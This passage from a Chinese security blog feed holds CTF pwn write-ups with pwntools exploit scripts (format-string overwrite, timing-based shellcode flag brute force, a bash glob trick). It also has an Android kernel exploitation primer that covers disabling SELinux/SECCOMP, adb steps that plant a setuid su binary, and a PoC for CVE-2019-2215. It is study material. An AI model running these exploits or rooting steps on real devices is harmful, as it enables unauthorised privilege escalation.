    <content type="html"><![CDATA[<h2 id="format"><a href="#format" class="headerlink" title="format"></a>format</h2><p>32位格式化字符串漏洞,只开了NX保护,有多次漏洞利用机会，并且有system(“/bin/sh”),题目难点在于是堆上的格式化字符串漏洞，不能用常规的任意地址写手法</p><p><img alt="1580540236536.png" data-src="https://i.loli.net/2020/02/02/m8HcfNuhn37EIJL.png" class="lozad"></p><h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>寻找如下图合适的跳板，第一次修改跳板为函数返回地址所在的栈地址，第二次修改函数返回地址为后门的地址。</p><p><img alt="1580541684651.png" data-src="https://i.loli.net/2020/02/02/eXNLWR6oSnIOHsy.png" class="lozad"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>成功几率16分之一</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context.log_level=<span class="string">'debug'</span> </span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> xrange(<span class="number">5000</span>): </span><br><span class="line"><span class="comment">#with remote("node3.buuoj.cn",26370) as p: </span></span><br><span class="line"><span class="keyword">with</span> process(<span class="string">"./chall"</span>) <span class="keyword">as</span> p: </span><br><span class="line">p.recvuntil(<span class="string">"...\n"</span>) </span><br><span class="line">p.recvuntil(<span class="string">"...\n"</span>) </span><br><span class="line">gdb.attach(p,<span class="string">"b *0x080485F6"</span>)</span><br><span class="line">p.sendline(<span class="string">"%60c%10$hhn|%34219c%18$hnBBB"</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p.recvuntil(<span class="string">"BBB"</span>) </span><br><span class="line"><span class="comment">#p.interactive() </span></span><br><span class="line">p.sendline(<span class="string">"ls"</span>) </span><br><span class="line">data = p.recvuntil(<span class="string">"flag"</span>) </span><br><span class="line">print(data) </span><br><span class="line"><span class="keyword">if</span>(<span class="string">"flag"</span> <span class="keyword">in</span> data): </span><br><span class="line">p.interactive() </span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e: </span><br><span class="line">print(<span class="string">'exception %s'</span> % e) </span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="nocall"><a href="#nocall" class="headerlink" title="nocall"></a>nocall</h2><p>64位程序，保护全开。题目提示输入shellcode,但这个题使用了seccomp机制，限制了execve系统调用。</p><p><img alt="1580542882966.png" data-src="https://i.loli.net/2020/02/02/sjCx4yRJo9XLfOd.png" class="lozad"><br><img alt="1580542965768.png" data-src="https://i.loli.net/2020/02/02/LIocbYu7xVNarG6.png" class="lozad"></p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>因为flag的地址已经暴露了，程序也开启了5秒的计时器，可以通过基于时间的方法爆破flag。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">s = <span class="string">'&#125;&#123;-0123456789abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x2000000000</span>,<span class="number">0x200000000</span>+<span class="number">0x30</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        payload=asm(</span><br><span class="line">            <span class="string">"""</span></span><br><span class="line"><span class="string">            mov al,[&#123;&#125;]</span></span><br><span class="line"><span class="string">            mov bl,&#123;&#125;</span></span><br><span class="line"><span class="string">        loop:</span></span><br><span class="line"><span class="string">            cmp al,bl</span></span><br><span class="line"><span class="string">            jz loop</span></span><br><span class="line"><span class="string">            ret</span></span><br><span class="line"><span class="string">            """</span>.format(str(hex(i)),str(hex(ord(j)))))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#p = remote("node3.buuoj.cn",29793)</span></span><br><span class="line">            p = process(<span class="string">"./chall"</span>)</span><br><span class="line">            p.recvuntil(<span class="string">"Your Shellcode &gt;&gt;"</span>)</span><br><span class="line">            time1=time()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> str(hex(i))+<span class="string">"-----"</span>+j</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            p.can_recv(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">            time2=time()</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="comment">#pause()</span></span><br><span class="line">            <span class="keyword">if</span> time2-time1&gt;<span class="number">1</span>:</span><br><span class="line">                flag+=j</span><br><span class="line">                <span class="keyword">print</span> flag</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h2 id="shellmaster"><a href="#shellmaster" class="headerlink" title="shellmaster"></a>shellmaster</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A=<span class="variable">$&#123;PATH##*:&#125;</span>;B=<span class="variable">$&#123;A%???&#125;</span>;<span class="variable">$PWD</span><span class="variable">$B</span>????</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;format&quot;&gt;&lt;a href=&quot;#format&quot; class=&quot;headerlink&quot; title=&quot;format&quot;&gt;&lt;/a&gt;format&lt;/h2&gt;&lt;p&gt;32位格式化字符串漏洞,只开了NX保护,有多次漏洞利用机会，并且有system(“/bin/sh”),题目难
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Android kernel 入门</title>
    <link href="https://nocbtm.github.io/2020/01/12/Android%20kernel%20%E5%85%A5%E9%97%A8/"/>
    <id>https://nocbtm.github.io/2020/01/12/Android kernel 入门/</id>
    <published>2020-01-12T12:02:02.000Z</published>
    <updated>2020-02-02T02:30:03.072Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="Android-系统架构"><a href="#Android-系统架构" class="headerlink" title="Android 系统架构"></a>Android 系统架构</h3><p>Android系统构架是安卓系统的体系结构，android的系统架构和其操作系统一样，采用了分层的架构，一般共分为四层，从高到低分别是：</p><ul><li>Android应用层 - 包括通话短信联系人这种系统级的应用，还包括用户自己安装的第三方应用</li><li>Android应用框架层 - 这一层大部分用Java写的，包括系统服务和四大组件</li><li>Android系统运行层  - 这一层大部分都是C/C++写的，主要是虚拟机 Dalvik/ART ，还有一些第三方库</li><li>Linux内核层 - 包含Linux内核和一些驱动，比如说蓝牙驱动，Camera驱动等等</li></ul><p>还有 HAL层-硬件抽象层</p><p>Android系统构架主要应用于ARM平台，但不仅限于ARM，通过编译控制，在X86、MAC等体系结构的机器上同样可以运行。<br><img alt="1579162747715.png" data-src="https://i.loli.net/2020/02/02/ZTSr8WpEQKBcz2o.png" class="lozad"></p><h3 id="Android进程间通信-binder"><a href="#Android进程间通信-binder" class="headerlink" title="Android进程间通信-binder"></a>Android进程间通信-binder</h3><ul><li>IPC(Inter-Process Communication)进程间通讯 </li><li>C（低权限应用）/S（高权限系统服务）</li><li>/dev/binder – framework和app之间IPC通信桥梁</li><li>/dev/hwbinder（8.0之后） – framework和vendor之间的IPC通信桥梁 </li><li>/dev/vndbinder（8.0之后） – vendor和vendor之间的IPC通信桥梁</li></ul><h3 id="SELinux限制"><a href="#SELinux限制" class="headerlink" title="SELinux限制"></a>SELinux限制</h3><p>Android 8.0之后推出厂商升级成本大大降低，8.0之后增加vendor.img镜像 ，攻击面大大减少， 很多厂商的代码不与应用层直接交互， 增加了应用和厂商代码的SELinux限制</p><h3 id="Android-内核攻击面"><a href="#Android-内核攻击面" class="headerlink" title="Android 内核攻击面"></a>Android 内核攻击面</h3><ul><li>应用直达内核路径寥寥无几 – /dev/binder、/dev/ashmem等</li><li>厂商自定义的驱动设备 – cat /proc/devices</li><li>应用 -&gt; system_server等 -&gt; 内核 </li><li>应用 -&gt; 系统应用 -&gt; system_server等 -&gt; 内核</li></ul><h3 id="Android内核缓释机制"><a href="#Android内核缓释机制" class="headerlink" title="Android内核缓释机制"></a>Android内核缓释机制</h3><ul><li>DAC/ CAP Linux最基本的安全缓释机制</li><li>PXN（Privileged Execute Never）类似于x86中的SMEP,防止内核态执行用户态代码,防御RET2USR攻击,可以通过修改rc4 来绕过。Android 5 arm64后开启，Android通过页表来开启PXN。<br><img alt="1579165663629.png" data-src="https://i.loli.net/2020/02/02/s5ISEpBU8m9Ng7u.png" class="lozad"></li><li>PAN (Privileged Access Never) 类似于x86中的SMAP ,防止内核任意读取用户态数据，Android 8.0之后加入。<br><img alt="1579166009547.png" data-src="https://i.loli.net/2020/02/02/tpbJR7ugO5scLB4.png" class="lozad"></li><li>SECCOMP 限制应用程序可以使用的系统调用，增加系统的安全性。shell中执行exp不会受到限制，apk中执行exp会受到seccomp限制，比如无法调到setuid、chroot、mount等。Android 8.0之后影响所有zygote孵化出来的进程。</li><li>KASLR 内核地址空间布局随机化，可以让kernel image映射的地址相对于链接地址有个偏移，利用需要泄露内核信息。Android kernel版本大于4.4之后默认开启。</li><li>AVB （Android  Verified Boot 启动时验证）启动时验证boot、system、vendor等是否被篡改，Persistent root 克星。Android 7.0 之后严格执行启动验证，Android 8.0 之后默认集成AVB2.0 ，有回滚保护，防止回滚到有漏洞的版本。</li></ul><h3 id="Android-内核漏洞利用基础知识"><a href="#Android-内核漏洞利用基础知识" class="headerlink" title="Android 内核漏洞利用基础知识"></a>Android 内核漏洞利用基础知识</h3><h4 id="内核关键数据结构"><a href="#内核关键数据结构" class="headerlink" title="内核关键数据结构"></a>内核关键数据结构</h4><ul><li><p>线程数据结构体，内核栈和hread_info共用一片区域 ,其中 addr_limit 用户态 0x7ffffffff000</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">union thread_union&#123;</span><br><span class="line">struct thread_info thread_info;</span><br><span class="line">unsigned long stack[THREAD_SIZE/sizeof(lone)];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct thread_info&#123;</span><br><span class="line">unsigned long flag; /*low level flag*/</span><br><span class="line">mm_segment_t addr_limit; /*address limit */</span><br><span class="line">struct task_struct *task; </span><br><span class="line">struct exec_domain *exec_domian;  /* execution domain */</span><br><span class="line">struct restart_block restart_block;</span><br><span class="line">int preempt_count;</span><br><span class="line">int cpu;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>进程描述符</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">struct task_ struct &#123;</span><br><span class="line">volatile long state; /* -1 unrunnable, 0 runnable, &gt;0 stopped */</span><br><span class="line">void *stack; // contains addr_ limi t</span><br><span class="line">unsigned int flags; /* per process flags, defined below */</span><br><span class="line">...</span><br><span class="line">struct list_ head tasks ;</span><br><span class="line">struct mm struct *mm， *active_ mm;</span><br><span class="line">#ifdef CONFIG COMPAT_ BRK</span><br><span class="line">unsigned brk randomized:1;</span><br><span class="line">...</span><br><span class="line">/* process credentials */</span><br><span class="line">const struct cred __rcu *real_cred; /* objective and real subjective task */</span><br><span class="line">consts truct cred __rcu *ered; /* effective (overridable) subjective task */</span><br><span class="line">char comm[TASK_COMM_LEN] ;</span><br><span class="line">...</span><br><span class="line">struct seccomp seccomp ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><img alt="1579168735865.png" data-src="https://i.loli.net/2020/02/02/oBFsXaP8MplYzu1.png" class="lozad"></p><ul><li><p>安全凭证cred</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">struct cred &#123;</span><br><span class="line">unsigned int usage;</span><br><span class="line">uid_t uid;</span><br><span class="line">gid_t gid;</span><br><span class="line">uid_t suid;</span><br><span class="line">gid_t sgid; </span><br><span class="line">uid_t euid;</span><br><span class="line">gid_t egid;</span><br><span class="line">uid_t fsuid;</span><br><span class="line">gid_t fsgid;</span><br><span class="line">unsigned int securebits;</span><br><span class="line">struct kernel_cap_struct cap_inheritable;</span><br><span class="line">struct kernel_cap_struct Cap_permitted;</span><br><span class="line">struct kernel_cap_struct cap_ef fective;</span><br><span class="line">struct kernel_cap_struct cap_bset;</span><br><span class="line">struct kernel_cap_struct cap_ambient;</span><br><span class="line">void *security; /* subjective LSM security */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>安全凭证 task_secutity 安全域</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct task_ security_ struct &#123;</span><br><span class="line">u32 osid; /* SID prior to last execve */</span><br><span class="line">u32 sid; /* current SID */</span><br><span class="line">u32 exec_sid;/* exec SID */</span><br><span class="line">u32 create_sid;/* fscreate SID */</span><br><span class="line">u32 keycreate_sid; /* keycreate SID */</span><br><span class="line">u32 sockcreate_sid; /* fscreate SID */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>内核关键全局变量<br>selinux_enforcing<br>selinux_enabled<br>init_stack<br>对于没有KASLR的设备地址固定，偏移固定。</p></li></ul><h4 id="关闭内核缓释机制"><a href="#关闭内核缓释机制" class="headerlink" title="关闭内核缓释机制"></a>关闭内核缓释机制</h4><p>1、关闭addr_limit </p><ul><li>内核线程栈低偏移8字节为addr_limit,将addr_limit 改为-1（0xffffffffffffffff）,关闭之后即可任意读写内核。</li></ul><p>2、 关闭DAC </p><ul><li>修改进程安全凭证cred中进程id相关值uid、gid等为init进程的值</li></ul><p>3、关闭CAP </p><ul><li>修改进程安全凭证cred中的cap相关值 cap_inheritable等为init进程的值</li></ul><p>4、 关闭SELinux</p><ul><li>修改selinux_enforcing 为0</li><li>修改selinux_enbaled 为0</li><li>修改进程安全凭证cred中的security安全域 osid、sid、exec_sid、create_sid、kercreate_sid、sockcreate_sid为init进程的值</li></ul><p>5、关闭SECCOMP</p><ul><li><p>修改thread_info中的flags,将seccomp位置0</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TLE_SECCOMP 11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _TIF_SECCOMP (1 &lt;&lt; TIE_SECCOMP)</span></span><br></pre></td></tr></table></figure></li><li><p>修改task_struct 中的seccomp中的mode为0</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct seccopm &#123;</span><br><span class="line">int mode;</span><br><span class="line">struct seccomp_filter *filter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="持久化root"><a href="#持久化root" class="headerlink" title="持久化root"></a>持久化root</h4><p>只适用于低版本Android：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">adb shell mount -0 remount,rw /system</span><br><span class="line">adb push su /system/xbin/su</span><br><span class="line">adb shell chown 0.0 /system/xbin/su</span><br><span class="line">adb shell chmod 06755 /system/xbin/su</span><br><span class="line">adb shell mount -0 remount,ro /system</span><br><span class="line">adb install Superuser.apk</span><br></pre></td></tr></table></figure></p><p>高版本(Android 7.0 之后) 无解</p><h4 id="Android-内核任意地址读写思路"><a href="#Android-内核任意地址读写思路" class="headerlink" title="Android 内核任意地址读写思路"></a>Android 内核任意地址读写思路</h4><p>1、用户态不能直接访问内核态<br>2、需要借助内核函数完成内核任意地址读写</p><ul><li>系统调用由内核完成</li><li>寻找系统调用中搬到参数合法的方式-&gt;addr_limit</li><li>read/write、readv/writev、recvmsg/sendmsg 等</li></ul><h2 id="Android源码阅读网站"><a href="#Android源码阅读网站" class="headerlink" title="Android源码阅读网站"></a>Android源码阅读网站</h2><ul><li>Google官方提供<br><a href="https://cs.android.com/android/platform/superproject" target="_blank" rel="noopener">https://cs.android.com/android/platform/superproject</a></li><li>在线xref<br>  <a href="http://androidxref.com/" target="_blank" rel="noopener">http://androidxref.com/</a></li></ul><h2 id="Android环境搭建"><a href="#Android环境搭建" class="headerlink" title="Android环境搭建"></a>Android环境搭建</h2><p>本地环境 ubuntu 16.04</p><ul><li>SDK安装<br><a href="https://developer.android.com/studio/releases/platform-tools" target="_blank" rel="noopener">https://developer.android.com/studio/releases/platform-tools</a><br>下载最新版29（截止2020.1）  确定adb可以使用<br>安装可参考 <a href="https://blog.csdn.net/u011974797/article/details/78973012" target="_blank" rel="noopener">https://blog.csdn.net/u011974797/article/details/78973012</a></li><li>NDK安装<br><a href="https://developer.android.com/ndk/downloads" target="_blank" rel="noopener">https://developer.android.com/ndk/downloads</a><br>下载最新版r20b（截止2020.1）确定ndk-build可以使用<br>安装可参考 <a href="https://blog.csdn.net/fanx9339/article/details/81116332" target="_blank" rel="noopener">https://blog.csdn.net/fanx9339/article/details/81116332</a></li></ul><h2 id="Android-root实验"><a href="#Android-root实验" class="headerlink" title="Android root实验"></a>Android root实验</h2><p>给定一个含有驱动漏洞的Android虚拟机，通过该驱动漏洞实现root</p><h3 id="1-1-确定Android版本号"><a href="#1-1-确定Android版本号" class="headerlink" title="1.1 确定Android版本号"></a>1.1 确定Android版本号</h3><p>adb shell getprop ro.build.version.release</p><h3 id="1-2-寻找有漏洞的驱动设备"><a href="#1-2-寻找有漏洞的驱动设备" class="headerlink" title="1.2 寻找有漏洞的驱动设备"></a>1.2 寻找有漏洞的驱动设备</h3><p>搜索 cdev_init()函数<br>cdev_init() 加载驱动设备函数<br><img alt="1579157694160.png" data-src="https://i.loli.net/2020/02/02/ErcVTB6nq3DSsya.png" class="lozad"><br>qword_FFFFFFC00055C438 里面注册 dev_open,dev_ioctl等<br><img alt="1579157575646.png" data-src="https://i.loli.net/2020/02/02/GcL7xFIm2zOVHkj.png" class="lozad"></p><h3 id="1-3-提取kernel符号表"><a href="#1-3-提取kernel符号表" class="headerlink" title="1.3 提取kernel符号表"></a>1.3 提取kernel符号表</h3><p>python ./vmlinux.py ./test/pixel_vmlinux</p><h3 id="1-4-IDA加载kernel并导入符号表"><a href="#1-4-IDA加载kernel并导入符号表" class="headerlink" title="1.4 IDA加载kernel并导入符号表"></a>1.4 IDA加载kernel并导入符号表</h3><p>vmlinux.py        -&gt;        C:\Program Files\IDA x.x\loaders\</p><h3 id="1-5-分析漏洞并完成kernel任意地址读写"><a href="#1-5-分析漏洞并完成kernel任意地址读写" class="headerlink" title="1.5 分析漏洞并完成kernel任意地址读写"></a>1.5 分析漏洞并完成kernel任意地址读写</h3><p>通过fop发现ioctl中存在任意地址读写漏洞<br><img alt="1579159294971.png" data-src="https://i.loli.net/2020/02/02/HQRKcxVIS7Jm1uF.png" class="lozad"></p><h3 id="1-6-提权到root"><a href="#1-6-提权到root" class="headerlink" title="1.6 提权到root"></a>1.6 提权到root</h3><h2 id="CVE-2019-2215-复现"><a href="#CVE-2019-2215-复现" class="headerlink" title="CVE-2019-2215 复现"></a>CVE-2019-2215 复现</h2><p>影响版本 Android 9.0 kernel 4.4</p><p>driver/android/binder.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">binder_ioctl</span><span class="params">(struct file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> </span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">case</span> BINDER_THREAD_EXIT:</span><br><span class="line">binder_debug(BINDER_DEBUG_THREADS, <span class="string">"%d:%d exit\n"</span>,</span><br><span class="line">proc-&gt;pid, thread-&gt;pid);</span><br><span class="line">binder_free_thread(proc, thread);</span><br><span class="line">thread = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">...</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Android kernel    4.4        driver/android/binder.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">binder_free_thread</span><span class="params">(struct binder_proc *proc,</span></span></span><br><span class="line"><span class="function"><span class="params">struct binder_thread *thread)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (send_reply)</span><br><span class="line">binder_send_failed_reply(send_reply, BR_DEAD_REPLY);</span><br><span class="line">binder_release_work(&amp;thread-&gt;todo);</span><br><span class="line">kfree(thread);</span><br><span class="line">binder_stats_deleted(BINDER_STAT_THREAD);</span><br><span class="line"><span class="keyword">return</span> active_transactions; &#125;</span><br></pre></td></tr></table></figure></p><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINDER_THREAD_EXIT 0x40046208ul</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd, epfd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span> = &#123;</span> .events = EPOLLIN &#125;;</span><br><span class="line">fd = open(<span class="string">"/dev/binder0"</span>, O_RDONLY);</span><br><span class="line">epfd = epoll_create(<span class="number">1000</span>);</span><br><span class="line">epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;event);</span><br><span class="line">ioctl(fd, BINDER_THREAD_EXIT, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>##其他命令<br>连接 Android shell<br>./adb shell </p><p>1、获取手机系统信息（ CPU，厂商名称等）<br>adb shell “cat /system/build.prop | grep “product””<br>2、获取手机系统版本<br>adb shell getprop ro.build.version.release</p><p>3、获取手机系统api版本<br>adb shell getprop ro.build.version.sdk</p><p>4、获取手机设备型号<br>adb -d shell getprop ro.product.model</p><p>5、获取手机厂商名称<br>adb -d shell getprop ro.product.brand</p><p>6、获取手机的序列号<br>有两种方式</p><ul><li>1、  adb get-serialno</li><li>2、  adb shell getprop ro.serialno</li></ul><p>7、获取手机内存信息<br>adb shell cat /proc/meminfo</p><p>8、获取手机存储信息<br>adb shell df</p><p>9、获取手机物理密度<br>adb shell wm density</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;headerlink&quot; title=&quot;基础知识&quot;&gt;&lt;/a&gt;基础知识&lt;/h2&gt;&lt;h3 id=&quot;Android-系统架构&quot;&gt;&lt;a href=&quot;#Android-系统架构&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
      <category term="android" scheme="https://nocbtm.github.io/categories/android/"/>
    
    
      <category term="android" scheme="https://nocbtm.github.io/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>分布式高并发tcp压力测试</title>
    <link href="https://nocbtm.github.io/2019/12/10/%E5%88%86%E5%B8%83%E5%BC%8F%E9%AB%98%E5%B9%B6%E5%8F%91tcp%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95/"/>
    <id>https://nocbtm.github.io/2019/12/10/分布式高并发tcp压力测试/</id>
    <published>2019-12-10T10:47:15.000Z</published>
    <updated>2020-02-01T11:04:04.136Z</updated>
    
    <content type="html"><![CDATA[<h2 id="task-manager-py"><a href="#task-manager-py" class="headerlink" title="task_manager.py"></a>task_manager.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 